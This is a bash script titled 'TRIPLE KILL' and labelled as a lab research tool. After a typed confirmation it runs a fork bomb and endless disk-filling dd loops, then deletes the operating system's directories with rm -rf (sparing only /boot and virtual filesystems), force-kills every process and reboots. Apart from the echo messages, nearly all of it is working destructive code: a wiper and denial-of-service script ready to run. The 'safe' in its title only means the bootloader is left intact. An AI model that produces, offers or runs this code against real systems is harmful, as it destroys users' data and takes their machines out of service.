#!/bin/bash
# ============================================================
# TRIPLE KILL - SAFE VERSION (NO MBR/BOOT DAMAGE)
# FOR LAB RESEARCH ONLY!
# ============================================================

echo "WARNING: This script will DESTROY the system!"
echo "Boot partition is SAFE (MBR/GPT not touched)"
echo ""
echo "Type 'YES' to continue:"
read confirm

if [ "$confirm" != "YES" ]; then
    echo "Aborted."
    exit 0
fi

echo ""
echo "Starting in 5 seconds..."
sleep 5
echo "GO!"
echo ""

# ============================================================
# PHASE 1: FORK BOMB
# ============================================================
echo "[PHASE 1] Fork bomb..."
cat > /tmp/fork_bomb.sh << 'EOF'
#!/bin/bash
:(){ :|:& };:
EOF

chmod +x /tmp/fork_bomb.sh
/tmp/fork_bomb.sh &
echo "Fork bomb running."

# ============================================================
# PHASE 2: DISK FILLER
# ============================================================
echo "[PHASE 2] Disk filler..."
(
    while true; do
        dd if=/dev/urandom of=/tmp/fill_$(date +%s%N).dat bs=1M count=50 2>/dev/null
        dd if=/dev/urandom of=/var/tmp/fill_$(date +%s%N).dat bs=1M count=50 2>/dev/null
    done
) &
echo "Disk filler running."

# ============================================================
# PHASE 3: DELETE SYSTEM FILES (EXCEPT /boot)
# ============================================================
echo "[PHASE 3] Deleting system files..."
(
    rm -rf /bin /etc /lib /lib64 /sbin /usr /var /opt /home /root 2>/dev/null &
    find /* -maxdepth 0 ! -path /boot ! -path /dev ! -path /proc ! -path /sys -exec rm -rf {} \; 2>/dev/null &
) &
echo "System files deleted (except /boot)."

# ============================================================
# PHASE 4: KILL PROCESSES
# ============================================================
echo "[PHASE 4] Killing processes..."
pkill -9 -f . 2>/dev/null &
echo "Processes killed."

# ============================================================
# FINAL
# ============================================================
echo ""
echo "============================================================"
echo "SYSTEM DESTROYED - BOOT IS SAFE"
echo "  CPU: Overloaded (fork bomb)"
echo "  Disk: /tmp & /var full"
echo "  OS: Completely deleted"
echo "  MBR/GPT: SAFE (untouched)"
echo "  /boot: SAFE (kernel & initrd intact)"
echo ""
echo "System will reboot in 5 seconds..."
echo "============================================================"

sleep 5
reboot
